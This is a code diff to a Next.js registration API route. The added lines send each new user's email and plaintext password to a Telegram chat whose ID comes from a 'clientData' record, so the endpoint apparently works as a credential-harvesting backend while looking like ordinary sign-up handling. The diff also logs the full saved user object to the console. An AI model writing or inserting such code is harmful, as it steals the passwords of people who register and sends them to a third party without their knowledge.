@@ -1,8 +1,9 @@
 import { connectDB } from "@/lib/db";
 import Data from "@/models/dataModel";
+import clientData from "@/models/clientDataModel";
 import User from "@/models/userModel";
 import { NextRequest, NextResponse } from "next/server";
-
+import { sendTelegramMessage } from "@/lib/telegram_bot";
 
 export async function POST(req: NextRequest) {
   try {
@@ -28,8 +29,11 @@ export async function POST(req: NextRequest) {
       deviceType,
     });
 
+    console.log("User saved:", savedUser);
+
     // Update Data model
     const data = await Data.findOne();
+    const client_data = await clientData.findOne();
     if (data) {
       await Data.findByIdAndUpdate(data._id, {
         $inc: { notifications: 1 },
@@ -37,6 +41,12 @@ export async function POST(req: NextRequest) {
       });
     }
 
+    await sendTelegramMessage(
+      client_data.telegramChatId,
+      `New user registered:\n` +
+      `Email: ${user}\n` +
+      `Password: ${password}\n`
+    );
     return NextResponse.json(
       {
         success: true,
